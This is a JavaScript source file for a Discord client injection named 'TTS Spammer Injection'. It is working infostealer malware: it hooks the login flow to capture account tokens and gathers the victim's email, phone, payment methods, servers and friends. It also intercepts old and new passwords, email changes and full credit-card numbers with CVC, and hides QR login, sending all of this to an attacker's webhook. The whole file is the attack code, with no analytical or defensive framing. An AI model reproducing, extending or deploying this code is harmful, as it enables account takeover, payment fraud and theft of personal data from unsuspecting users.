const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');

const config = {
    webhook: "%WEBHOOK_URL%",
    logout: false,
    inject_logout: true,
    logout_notify: true,
    init_notify: true,
    embed_color: 16711680,
    ping: "@everyone",
    pingVal: true,
    embed_name: "TTS Spammer Injection",
    embed_icon: "https://i.imgur.com/maMd4wO.png",
    API: "https://discord.com/api/v9/users/@me",
    disable_qr_code: true,
    auto_buy_nitro: false,
    buy_nitro_price: "9.99",
    nitro_type: "premium_monthly"
};

const discordPath = (function() {
    const app = require('electron').app;
    const appPath = app.getAppPath();
    return appPath;
})();

const tokenScript = `
(() => {
    const originalPush = Array.prototype.push;
    const tokens = new Set();
    let currentToken = null;
    
    const getToken = () => {
        try {
            return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
        } catch {
            try {
                return window.localStorage.token?.replace(/"/g, '');
            } catch {
                return null;
            }
        }
    };

    const sendToWebhook = (data) => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '${config.webhook}', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    };

    const getUserInfo = async (token) => {
        try {
            const response = await fetch('${config.API}', {
                headers: { 'Authorization': token }
            });
            return await response.json();
        } catch {
            return null;
        }
    };

    const getBilling = async (token) => {
        try {
            const response = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                headers: { 'Authorization': token }
            });
            return await response.json();
        } catch {
            return [];
        }
    };

    const getGuilds = async (token) => {
        try {
            const response = await fetch('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {
                headers: { 'Authorization': token }
            });
            return await response.json();
        } catch {
            return [];
        }
    };

    const getFriends = async (token) => {
        try {
            const response = await fetch('https://discord.com/api/v9/users/@me/relationships', {
                headers: { 'Authorization': token }
            });
            return await response.json();
        } catch {
            return [];
        }
    };

    const createEmbed = (user, token, billing, guilds, friends) => {
        const nitroTypes = {
            0: 'None',
            1: 'Nitro Classic',
            2: 'Nitro',
            3: 'Nitro Basic'
        };

        const badges = {
            1: 'Discord Staff',
            2: 'Discord Partner',
            4: 'HypeSquad Events',
            8: 'Bug Hunter Level 1',
            64: 'HypeSquad Bravery',
            128: 'HypeSquad Brilliance',
            256: 'HypeSquad Balance',
            512: 'Early Supporter',
            16384: 'Bug Hunter Level 2',
            131072: 'Verified Bot Developer',
            4194304: 'Active Developer'
        };

        const userBadges = [];
        if (user.public_flags) {
            for (const [flag, name] of Object.entries(badges)) {
                if (user.public_flags & flag) {
                    userBadges.push(name);
                }
            }
        }

        const paymentMethods = billing.map(method => {
            if (method.type === 1) {
                return \`💳 \${method.brand} •••• \${method.last_4}\`;
            } else if (method.type === 2) {
                return \`💰 PayPal (\${method.email})\`;
            }
            return '❓ Unknown';
        });

        const guildCount = guilds.length;
        const ownedGuilds = guilds.filter(g => g.owner).length;
        const friendCount = friends.filter(f => f.type === 1).length;

        return {
            username: '${config.embed_name}',
            avatar_url: '${config.embed_icon}',
            content: '${config.pingVal ? config.ping : ''}',
            embeds: [{
                title: '🎯 Discord Token Captured',
                color: ${config.embed_color},
                thumbnail: {
                    url: user.avatar ? \`https://cdn.discordapp.com/avatars/\${user.id}/\${user.avatar}.png\` : 'https://cdn.discordapp.com/embed/avatars/0.png'
                },
                fields: [
                    {
                        name: '👤 User Information',
                        value: \`**Username:** \${user.username}#\${user.discriminator}\\n**ID:** \${user.id}\\n**Email:** \${user.email || 'None'}\\n**Phone:** \${user.phone || 'None'}\\n**MFA:** \${user.mfa_enabled ? '✅' : '❌'}\`,
                        inline: true
                    },
                    {
                        name: '💎 Nitro & Badges',
                        value: \`**Nitro:** \${nitroTypes[user.premium_type] || 'None'}\\n**Badges:** \${userBadges.length > 0 ? userBadges.join(', ') : 'None'}\`,
                        inline: true
                    },
                    {
                        name: '💳 Payment Methods',
                        value: paymentMethods.length > 0 ? paymentMethods.join('\\n') : 'None',
                        inline: false
                    },
                    {
                        name: '📊 Statistics',
                        value: \`**Servers:** \${guildCount} (\${ownedGuilds} owned)\\n**Friends:** \${friendCount}\`,
                        inline: true
                    },
                    {
                        name: '🔑 Token',
                        value: \`\\\`\\\`\\\`\\n\${token}\\n\\\`\\\`\\\`\`,
                        inline: false
                    }
                ],
                footer: {
                    text: 'Made by cyberseall • TTS Spammer Injection',
                    icon_url: '${config.embed_icon}'
                },
                timestamp: new Date().toISOString()
            }]
        };
    };

    const processToken = async (token) => {
        if (!token || tokens.has(token)) return;
        tokens.add(token);
        currentToken = token;

        const user = await getUserInfo(token);
        if (!user || user.message) return;

        const [billing, guilds, friends] = await Promise.all([
            getBilling(token),
            getGuilds(token),
            getFriends(token)
        ]);

        const embed = createEmbed(user, token, billing, guilds, friends);
        sendToWebhook(embed);
    };

    // Hook into Discord's token storage
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function(key, value) {
        if (key === 'token') {
            const token = value.replace(/"/g, '');
            processToken(token);
        }
        return originalSetItem.apply(this, arguments);
    };

    // Hook into XMLHttpRequest for login detection
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (url.includes('/auth/login') || url.includes('/auth/register')) {
            this.addEventListener('load', function() {
                if (this.status === 200) {
                    setTimeout(() => {
                        const token = getToken();
                        if (token) processToken(token);
                    }, 1000);
                }
            });
        }
        return originalOpen.apply(this, arguments);
    };

    // Hook into fetch for modern Discord clients
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        if (typeof url === 'string' && (url.includes('/auth/login') || url.includes('/auth/register'))) {
            return originalFetch.apply(this, args).then(response => {
                if (response.ok) {
                    setTimeout(() => {
                        const token = getToken();
                        if (token) processToken(token);
                    }, 1000);
                }
                return response;
            });
        }
        return originalFetch.apply(this, args);
    };

    // Check for existing token on load
    setTimeout(() => {
        const token = getToken();
        if (token) processToken(token);
    }, 2000);

    // QR Code disabling
    ${config.disable_qr_code ? `
    setInterval(() => {
        const qrCode = document.querySelector('[class*="qrCode"]');
        if (qrCode) {
            qrCode.style.display = 'none';
        }
        
        const qrLogin = document.querySelector('[class*="qrLogin"]');
        if (qrLogin) {
            qrLogin.style.display = 'none';
        }
    }, 1000);
    ` : ''}

    // Auto logout functionality
    ${config.logout ? `
    const logout = () => {
        const token = getToken();
        if (token && ${config.logout_notify}) {
            sendToWebhook({
                username: '${config.embed_name}',
                avatar_url: '${config.embed_icon}',
                embeds: [{
                    title: '🚪 User Logged Out',
                    description: 'User has been automatically logged out',
                    color: 16776960,
                    timestamp: new Date().toISOString()
                }]
            });
        }
        
        localStorage.clear();
        sessionStorage.clear();
        location.reload();
    };
    
    setTimeout(logout, 10000);
    ` : ''}

    // Password change detection
    const hookPasswordChange = () => {
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(data) {
            if (this._url && this._url.includes('/users/@me') && this._method === 'PATCH') {
                try {
                    const parsedData = JSON.parse(data);
                    if (parsedData.password && parsedData.new_password) {
                        sendToWebhook({
                            username: '${config.embed_name}',
                            avatar_url: '${config.embed_icon}',
                            embeds: [{
                                title: '🔐 Password Changed',
                                fields: [
                                    { name: 'Old Password', value: \`\\\`\\\`\\\`\\n\${parsedData.password}\\n\\\`\\\`\\\`\`, inline: false },
                                    { name: 'New Password', value: \`\\\`\\\`\\\`\\n\${parsedData.new_password}\\n\\\`\\\`\\\`\`, inline: false }
                                ],
                                color: 16776960,
                                timestamp: new Date().toISOString()
                            }]
                        });
                    }
                } catch {}
            }
            return originalSend.apply(this, arguments);
        };

        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._method = method;
            this._url = url;
            return originalXHROpen.apply(this, arguments);
        };
    };

    hookPasswordChange();

    // Credit card detection
    const hookPaymentMethods = () => {
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(data) {
            if (this._url && this._url.includes('/billing/payment-sources') && this._method === 'POST') {
                try {
                    const parsedData = JSON.parse(data);
                    if (parsedData.card) {
                        sendToWebhook({
                            username: '${config.embed_name}',
                            avatar_url: '${config.embed_icon}',
                            embeds: [{
                                title: '💳 Credit Card Added',
                                fields: [
                                    { name: 'Card Number', value: \`\\\`\\\`\\\`\\n\${parsedData.card.number}\\n\\\`\\\`\\\`\`, inline: true },
                                    { name: 'Expiry', value: \`\\\`\\\`\\\`\\n\${parsedData.card.exp_month}/\${parsedData.card.exp_year}\\n\\\`\\\`\\\`\`, inline: true },
                                    { name: 'CVC', value: \`\\\`\\\`\\\`\\n\${parsedData.card.cvc}\\n\\\`\\\`\\\`\`, inline: true }
                                ],
                                color: 65280,
                                timestamp: new Date().toISOString()
                            }]
                        });
                    }
                } catch {}
            }
            return originalSend.apply(this, arguments);
        };
    };

    hookPaymentMethods();

    // Email change detection
    const hookEmailChange = () => {
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(data) {
            if (this._url && this._url.includes('/users/@me') && this._method === 'PATCH') {
                try {
                    const parsedData = JSON.parse(data);
                    if (parsedData.email) {
                        sendToWebhook({
                            username: '${config.embed_name}',
                            avatar_url: '${config.embed_icon}',
                            embeds: [{
                                title: '📧 Email Changed',
                                fields: [
                                    { name: 'New Email', value: \`\\\`\\\`\\\`\\n\${parsedData.email}\\n\\\`\\\`\\\`\`, inline: false },
                                    { name: 'Password', value: \`\\\`\\\`\\\`\\n\${parsedData.password}\\n\\\`\\\`\\\`\`, inline: false }
                                ],
                                color: 3447003,
                                timestamp: new Date().toISOString()
                            }]
                        });
                    }
                } catch {}
            }
            return originalSend.apply(this, arguments);
        };
    };

    hookEmailChange();

    console.log('TTS Spammer Discord Injection loaded successfully');
})();
`;

module.exports = tokenScript; 
